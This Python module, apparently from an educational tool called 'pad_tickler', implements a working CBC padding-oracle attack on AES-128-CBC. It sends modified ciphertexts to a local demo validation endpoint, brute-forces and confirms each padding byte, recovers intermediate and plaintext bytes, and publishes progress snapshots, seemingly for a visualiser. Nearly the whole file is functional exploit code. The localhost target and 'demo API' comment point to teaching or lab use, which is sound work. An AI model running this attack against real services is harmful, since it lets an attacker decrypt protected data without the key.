import time
from typing import Callable, Tuple

import requests

from pad_tickler.utils import b64_encode
from pad_tickler.state_snapshot import StateSnapshot
from pad_tickler.state_queue import SingleSlotQueue


SubmitFn = Callable[[bytes, bytes], bool]

MAX_POSSIBLE_STEPS = 0
CURRENT_STEP = 0
BYTES_FOUND = 0
BYTES_TOTAL = 0
COMPLETION_PERCENT = 0.00


def submit_guess(prev_block: bytes, target_block: bytes) -> bool:
    """ Submit a padding guess to the oracle (demo API) to validate the given ciphertext. """
    ciphertext = prev_block + target_block
    ciphertext_b64 = b64_encode(ciphertext)
    payload = {
        "alg": "AES-128-CBC",
        "ciphertext_b64": ciphertext_b64
    }
    try:
        response = requests.post("http://127.0.0.1:8000/api/validate", json=payload, timeout=10)
        time.sleep(0.01)  # Small delay to prevent overwhelming the server
        return response.status_code == 200
    except Exception as e:
        print(f"Request failed: {e}")
        return False


def _confirm_hit(submit: SubmitFn, cprev_prime: bytearray, ctarget: bytes, k: int) -> Tuple[bool, int]:
    """
    Flip a byte **outside** the last k bytes (i.e., index < 16 - k) and re-submit.
    If still valid, treat as a confirmed padding hit for this k.
    Returns (confirmed, flipped_index_or_-1).
    """
    bsz = len(ctarget)
    flip_idx = (bsz - k - 1)
    if flip_idx < 0:
        # No non-tail byte to flip (this happens at k == block_size). Accept as confirmed.
        return True, -1

    c2 = cprev_prime[:]
    c2[flip_idx] ^= 0x01
    ok2 = submit(bytes(c2), ctarget)
    return ok2, flip_idx


def solve_message(
    submit: SubmitFn,
    state_queue: SingleSlotQueue[StateSnapshot],
    ciphertext: bytes,
    *,
    block_size: int = 16,
):
    """
    Solve all blocks of a CBC-encrypted message via a padding oracle.
    - iv: 16-byte IV (AES)
    - ciphertext: N*16 bytes
    Returns plaintext, intermediates per block, and per-block stats.
    """
    global CURRENT_STEP, MAX_POSSIBLE_STEPS, COMPLETION_PERCENT, BYTES_FOUND, BYTES_TOTAL

    try:
        assert len(ciphertext) % block_size == 0, "ciphertext must be block-aligned"

        # Break the ciphertext into blocks.
        ciphertext_blocks = [ciphertext[i:i + block_size] for i in range(0, len(ciphertext), block_size)]
        block_count = len(ciphertext_blocks)

        # Initialize other sets of blocks.
        ciphertext_prime_blocks = [bytearray(block) for block in ciphertext_blocks]
        intermediate_blocks = [[None for _ in range(block_size)] for _ in range(block_count)]
        plaintext_blocks = [[None for _ in range(block_size)] for _ in range(block_count)]

        MAX_POSSIBLE_STEPS = 256 * block_size * (block_count - 1)  # Don't count IV
        CURRENT_STEP = 0
        BYTES_FOUND = 0
        BYTES_TOTAL = len(ciphertext) - block_size  # Don't count IV bytes

        state_version = 0

        # Skip the first block (IV) and only decrypt actual ciphertext blocks
        for block_index_n, ciphertext_n in enumerate(ciphertext_blocks[1:], start=1):

            #print(f"Solving block {block_index_n}/{block_count - 1}...")
            # The previous block for decryption (IV for first block, previous ciphertext for others)
            ciphertext_prime_n1 = ciphertext_prime_blocks[block_index_n - 1]

            #########################################################
            # Solve an individual block
            #res = solve_block(submit, block_count, n, c_prev, c_i, block_size=block_size)
            skip_trivial_original = True


            assert len(ciphertext_prime_n1) == block_size and len(ciphertext_n) == block_size
            #stats = BlockStats()
            last = block_size - 1

            # Storage for intermediate bytes I_i (fill right->left)
            intermediate_n = intermediate_blocks[block_index_n]

            # We'll mutate a working copy of C_{i-1}
            # print(f"ciphertext_prime_n1 type before: {type(ciphertext_prime_n1)}")
            # ciphertext_prime_n1 = bytearray(ciphertext_prime_n1)
            # print(f"ciphertext_prime_n1 type after: {type(ciphertext_prime_n1)}")
            # breakpoint()

            # Create a new snapshot of the state.
            intermediate_i = block_size - 1 # Start from the last byte position.
            byte_value_g = 0 # Start with byte value 0.
            pad_length_k = 1 # Start with padding length 1.

            state_version += 1
            snapshot = StateSnapshot(
                state_version=state_version,
                complete=False,
                block_count=block_count - 1,  # Don't count IV as a block to decrypt
                block_size=block_size,
                block_index_n=block_index_n,  # Already 1-based from enumerate start=1
                byte_index_i=intermediate_i,
                byte_value_g=byte_value_g,
                pad_length_k=pad_length_k,
                ciphertext=tuple(tuple(block) for block in ciphertext_blocks),
                ciphertext_prime=tuple(tuple(block) for block in ciphertext_prime_blocks),
                intermediate=intermediate_blocks,
                plaintext=plaintext_blocks,
            )
            state_queue.publish(snapshot)

            # Optional: observe whether the original pair is valid (not used for logic)
            ok_orig = submit(ciphertext_prime_n1, ciphertext_n)
            #stats.tries += 1
            # if ok_orig:
            #     #stats.positives += 1
            #     #stats.notes.append("original pair decrypts to valid PKCS#7")
            # else:
            #     #stats.negatives += 1

            # For k = 1..block_size
            for pad_length_k in range(1, block_size + 1):
                # 1) Program the already-solved tail bytes to decrypt as k
                #    tail indices: [block_size - (k-1), ..., block_size-1]
                for j in range(block_size - (pad_length_k - 1), block_size):
                    intermediate_i = intermediate_n[j]
                    if intermediate_i is None:
                        # not solved yet (will happen only at start of each k)
                        continue
                    ciphertext_prime_n1[j] = intermediate_i ^ pad_length_k

                # 2) Brute-force the new target byte at i = block_size - k
                byte_index_i = block_size - pad_length_k
                found = False
                for byte_value_g in range(256):
                    CURRENT_STEP += 1

                    # Skip trivial original only for k==1 (classic optimization)
                    original_byte_value = ciphertext_prime_n1[byte_index_i]
                    if skip_trivial_original and pad_length_k == 1 and byte_value_g == original_byte_value:
                        continue

                    ciphertext_prime_n1[byte_index_i] = byte_value_g

                    state_version += 1
                    snapshot = StateSnapshot(
                        state_version=state_version,
                        complete=False,
                        block_count=block_count - 1,  # Don't count IV as a block to decrypt
                        block_size=block_size,
                        block_index_n=block_index_n,  # Already 1-based from enumerate start=1
                        byte_index_i=byte_index_i,
                        byte_value_g=byte_value_g,
                        pad_length_k=pad_length_k,
                        ciphertext=tuple(tuple(block) for block in ciphertext_blocks),
                        ciphertext_prime=tuple(tuple(block) for block in ciphertext_prime_blocks),
                        intermediate=intermediate_blocks,
                        plaintext=plaintext_blocks,
                    )
                    state_queue.publish(snapshot)

                    ok = submit(bytes(ciphertext_prime_n1), ciphertext_n)
                    #stats.tries += 1
                    if not ok:
                        #stats.negatives += 1
                        #print(cprev_prime.hex(" "), f"\t{COMPLETION_PERCENT:.2f}% ({BYTES_FOUND}/{BYTES_TOTAL}) | n={n+1}/{block_count} | i={i} | k={k} | g={g:02x} | ok={ok}")
                        continue

                    # Positive: confirm by flipping a non-tail byte
                    confirmed, flip_idx = _confirm_hit(submit, ciphertext_prime_n1, ciphertext_n, pad_length_k)
                    #stats.tries += (0 if flip_idx == -1 else 1)  # _confirm_hit already counted internally
                    if confirmed:
                        #stats.positives += 1 + (0 if flip_idx == -1 else 1)
                        #stats.confirmed_hits += 1
                        intermediate_n[byte_index_i] = byte_value_g ^ pad_length_k
                        # For CBC mode, plaintext = intermediate XOR previous_ciphertext_block
                        # The previous block is ciphertext_blocks[block_index_n - 1] (IV for first block, previous ciphertext for others)
                        prev_block = ciphertext_blocks[block_index_n - 1]
                        plaintext_blocks[block_index_n][byte_index_i] = prev_block[byte_index_i] ^ intermediate_n[byte_index_i]
                        found = True
                        BYTES_FOUND += 1
                        COMPLETION_PERCENT = BYTES_FOUND / BYTES_TOTAL * 100
                        #print(cprev_prime.hex(" "), f"\t{COMPLETION_PERCENT:.2f}% ({BYTES_FOUND}/{BYTES_TOTAL}) | n={n+1}/{block_count} | i={i} | k={k} | g={g:02x} | ok={ok} | confirmed={confirmed} | flip_idx={flip_idx}")
                        break
                    else:
                        # Not confirmed -> likely false positive (e.g., collided with larger original padding)
                        #stats.positives += 1
                        #stats.negatives += 1
                        #print(cprev_prime.hex(" "), f"\t{COMPLETION_PERCENT:.2f}% ({BYTES_FOUND}/{BYTES_TOTAL}) | n={n+1}/{block_count} | i={i} | k={k} | g={g:02x} | ok={ok} | confirmed={confirmed} | flip_idx={flip_idx}")
                        continue

                if not found:
                    raise RuntimeError(f"No valid guess found at k={pad_length_k} (i={byte_index_i}); oracle not behaving like pure PKCS#7?")

            # Build bytes
            #i_block = bytes(x for x in intermediate_n)  # type: ignore
            # Plaintext uses the **original** previous block (not the mutated one)
            #plaintext_n = bytes((intermediate_n[b] ^ ciphertext_prime_n1[b]) for b in range(block_size))
            #plaintext_blocks[block_index_n] = plaintext_n


            #########################################################
            # After individual block solving
            #print(f"Block {n + 1}/{block_count} solved: {res.stats.tries} requests, {res.stats.confirmed_hits} confirmed hits") if res.stats else print(f"Block {n + 1}/{block_count} solved: no stats") # type: ignore

        state_version += 1
        snapshot = StateSnapshot(
            state_version=state_version,
            complete=True,
            block_count=block_count - 1,  # Don't count IV as a block to decrypt
            block_size=block_size,
            block_index_n=block_index_n,  # Already 1-based from enumerate start=1
            byte_index_i=byte_index_i,
            byte_value_g=byte_value_g,
            pad_length_k=pad_length_k,
            ciphertext=tuple(tuple(block) for block in ciphertext_blocks),
            ciphertext_prime=tuple(tuple(block) for block in ciphertext_prime_blocks),
            intermediate=intermediate_blocks,
            plaintext=plaintext_blocks,
        )
        state_queue.publish(snapshot)

    except Exception as e:
        print(f"Error in solve_message: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Always close the queue so the UI can exit
        state_queue.close()
